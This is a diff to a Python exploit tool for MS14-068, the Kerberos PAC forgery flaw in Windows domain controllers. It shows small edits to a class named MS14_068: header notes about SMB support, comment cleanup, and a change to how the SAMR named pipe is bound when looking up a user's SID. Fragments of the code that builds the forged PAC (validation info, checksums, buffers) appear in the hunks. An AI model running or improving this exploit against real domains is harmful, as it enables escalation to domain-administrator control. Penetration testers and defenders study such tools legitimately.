@@ -17,7 +17,7 @@
 #   A few important things:
 #   1) you must use the domain FQDN
 #   2) target must be a FQDN as well and matching the target's NetBIOS (not 100% sure)
-#   3) As of right now, it only supports SMB > 1, sorry old systems
+#   3) As of right now, it only supports SMB > 1, sorry old systems - DONE
 #   4) Lots of things might not work, testing needed!
 #   5) Ohh.. hashes still not working.. but that'll be easy
 #   6) Just RC4 at the moment
@@ -623,7 +623,7 @@ class MS14_068():
         unixTime = getFileTime(aTime)
 
         kerbdata = KERB_VALIDATION_INFO()
-        # Aca poner el authTime
+
         kerbdata['LogonTime']['dwLowDateTime']           = unixTime & 0xffffffff
         kerbdata['LogonTime']['dwHighDateTime']          = unixTime >>32
 
@@ -743,7 +743,6 @@ class MS14_068():
         offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-
         buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(pacClientInfo) + pacClientInfoAlignment
         buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
 
@@ -897,7 +896,7 @@ class MS14_068():
         return r, cipher, newSessionKey
 
     def getUserSID(self):
-        stringBinding = epm.hept_map(self.__domain, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
+        stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__domain
 
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
